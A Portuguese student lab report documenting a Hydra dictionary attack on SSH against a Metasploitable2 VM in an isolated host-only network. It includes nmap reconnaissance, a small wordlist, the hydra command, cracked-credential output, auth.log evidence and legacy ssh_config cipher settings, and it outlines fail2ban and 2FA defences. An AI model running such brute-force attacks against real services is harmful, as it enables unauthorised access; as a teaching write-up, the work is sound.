# Laboratório de Segurança de Credenciais e Autenticação

## Ataque de Força Bruta contra Serviço SSH com Hydra

### Objetivo

Esta atividade prática teve como objetivo demonstrar, em ambiente controlado e isolado, a fragilidade de senhas fracas ou previsíveis frente a um ataque de dicionário (Dictionary Attack), evidenciando a necessidade de políticas de senha robustas e de camadas adicionais de autenticação.

---

## 1. Ambiente de Laboratório

### 1.1 Topologia da rede

O laboratório foi montado com duas máquinas virtuais no VirtualBox, conectadas exclusivamente por uma rede **Host-only** (`vboxnet0`), garantindo isolamento total da internet e de qualquer outra rede. As duas VMs só se enxergam entre si e com o host.

| Máquina | Função | Sistema | Endereço IP |
|---|---|---|---|
| Kali Linux | Atacante | Kali Linux (rolling) | `192.168.56.5` |
| Metasploitable2 | Alvo | Ubuntu 8.04 (Metasploitable2) | `192.168.56.10` |

A rede host-only foi criada via **VirtualBox > Ferramentas de Rede > Redes Exclusivas do Host**, e o adaptador de rede de cada VM foi configurado como **Adaptador Exclusivo do Host (Host-only Adapter)** apontando para essa rede.

### 1.2 Verificação de conectividade

A conectividade entre as VMs foi validada com sucesso:

```bash
ping -c 4 192.168.56.10
```

Resultado: 4 pacotes transmitidos, 4 recebidos, 0% de perda — confirmando que ambas as máquinas estão na mesma sub-rede isolada e se comunicam corretamente.

---

## 2. Reconhecimento (Information Gathering)

Antes do ataque, foi realizado um escaneamento de portas e serviços no alvo com o **Nmap**, para identificar os serviços ativos:

```bash
nmap -sV 192.168.56.10
```

### Principais resultados:

| Porta | Serviço | Versão |
|---|---|---|
| 21/tcp | ftp | vsftpd 2.3.4 |
| 22/tcp | ssh | OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) |
| 23/tcp | telnet | Linux telnetd |
| 80/tcp | http | Apache httpd 2.2.8 |

O serviço escolhido como alvo do ataque foi o **SSH (porta 22)**, rodando OpenSSH 4.7p1 — uma versão antiga e vulnerável, característica do Metasploitable2.

---

## 3. Etapa 1 — Ataque de Dictionary Attack contra SSH

### 3.1 Ferramenta utilizada

**Hydra v9.6** (THC-Hydra), ferramenta de força bruta/dicionário para múltiplos protocolos, incluindo SSH.

### 3.2 Wordlist utilizada

Foi construída uma wordlist simulando senhas fracas e previsíveis, comumente encontradas em listas de senhas vazadas:

```bash
cat senha.txt
```

```
123456
admin
senha123
12345678
msfadmin
```

A última entrada (`msfadmin`) corresponde à senha real do usuário `msfadmin` no Metasploitable2 — incluída na lista para simular um cenário realista em que o atacante já possui parte da informação (por exemplo, obtida via OSINT, engenharia social ou vazamento prévio de credenciais).

### 3.3 Comando de ataque

```bash
hydra -l msfadmin -P senha.txt ssh://192.168.56.10
```

**Parâmetros:**
- `-l msfadmin` → usuário-alvo fixo
- `-P senha.txt` → wordlist de senhas a testar
- `ssh://192.168.56.10` → protocolo e IP do alvo

### 3.4 Ajuste de compatibilidade

Como o Metasploitable2 utiliza uma versão muito antiga do OpenSSH (2008), foi necessário habilitar algoritmos criptográficos legados no cliente SSH do Kali, desabilitados por padrão em versões recentes por motivos de segurança. Ajuste feito em `/etc/ssh/ssh_config`:

```
Host *
    KexAlgorithms +diffie-hellman-group1-sha1
    HostkeyAlgorithms +ssh-rsa
    PubkeyAcceptedAlgorithms +ssh-rsa
    Ciphers +aes128-cbc,3des-cbc
    MACs +hmac-md5,hmac-sha1
```

### 3.5 Resultado do ataque

```
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:1/p:5)
[DATA] attacking ssh://192.168.56.10:22/
[22][ssh] host: 192.168.56.10   login: msfadmin   password: msfadmin
1 of 1 target successfully completed, 1 valid password found
Hydra finished
```

**A credencial foi descoberta com sucesso em poucos segundos**, comprovando a baixa resistência de uma senha idêntica ao nome de usuário frente a um ataque de dicionário automatizado.

### 3.6 Evidência do lado do servidor (log de autenticação)

Para validar o ataque também do ponto de vista do alvo, foi consultado o log de autenticação do Metasploitable2:

```bash
tail -30 /var/log/auth.log
```

Trecho relevante do log, evidenciando as tentativas de conexão originadas do IP do atacante (`192.168.56.5`):

```
May 16 11:41:06 metasploitable sshd[5387]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.56.5 user=msfadmin
May 16 11:41:06 metasploitable sshd[5388]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.56.5 user=msfadmin
May 16 11:41:06 metasploitable sshd[5385]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.56.5 user=msfadmin
May 16 11:41:06 metasploitable sshd[5390]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.56.5 user=msfadmin
May 16 11:41:06 metasploitable sshd[5392]: Accepted password for msfadmin from 192.168.56.5 port 42500 ssh2
May 16 11:41:06 metasploitable sshd[5395]: pam_unix(sshd:session): session opened for user msfadmin by (uid=0)
```

O log confirma, de forma independente, a sequência de tentativas falhas seguidas pela autenticação aceita — corroborando o resultado obtido pelo Hydra.

---

## 4. Análise dos resultados

A wordlist utilizada continha apenas 5 entradas, e ainda assim foi suficiente para comprometer a credencial em segundos. Esse resultado evidencia:

- **Senhas idênticas ou similares ao nome de usuário** (`msfadmin`/`msfadmin`) são triviais de descobrir, mesmo sem grandes recursos computacionais.
- Ataques de dicionário são **altamente eficazes** contra serviços SSH expostos sem proteção adicional, especialmente quando não há limite de tentativas de autenticação.
- Quanto menor a complexidade da senha (curta, previsível, sem caracteres especiais), menor o tempo necessário para a quebra — o que reforça a necessidade de políticas de senha que exijam comprimento mínimo, uso de caracteres especiais e ausência de padrões óbvios.

---

## 5. Etapa 2 — Mecanismos de Defesa (não implementada nesta entrega)

Por limitação de tempo, a etapa de defesa (bloqueio de conta após tentativas falhas via `fail2ban` e implementação de autenticação de dois fatores via PAM/Google Authenticator) **não foi implementada nesta versão da atividade**.

Como direcionamento teórico de como essas camadas mitigariam o ataque demonstrado:

- **Bloqueio temporário de conta (fail2ban)**: monitora o log `/var/log/auth.log` e, após um número configurável de tentativas falhas (ex.: 3 em 10 minutos), bane o IP de origem por um período determinado, tornando ataques de força bruta automatizados impraticáveis.
- **Autenticação de Dois Fatores (2FA/MFA)**: mesmo que o atacante descubra a senha correta (como ocorreu nesta atividade), o acesso continuaria bloqueado sem o segundo fator (código TOTP gerado por aplicativo autenticador), neutralizando o ataque de dicionário como vetor único de comprometimento.

---

## 6. Considerações éticas

Toda a atividade foi conduzida em **ambiente de rede isolado (Host-only)**, sem qualquer conexão com a internet ou redes de terceiros. As máquinas atacante e alvo são de propriedade e controle exclusivo do autor desta atividade, configuradas especificamente para fins educacionais. Em nenhum momento ferramentas de ataque foram direcionadas a sistemas de terceiros ou fora do ambiente controlado.

---

## 7. Ferramentas utilizadas

| Ferramenta | Função |
|---|---|
| VirtualBox | Virtualização e isolamento de rede (Host-only) |
| Kali Linux | Sistema operacional do atacante |
| Metasploitable2 | Sistema operacional alvo (intencionalmente vulnerável) |
| Nmap | Reconhecimento de portas e serviços |
| Hydra (THC-Hydra) | Ataque de dicionário contra serviço SSH |

---

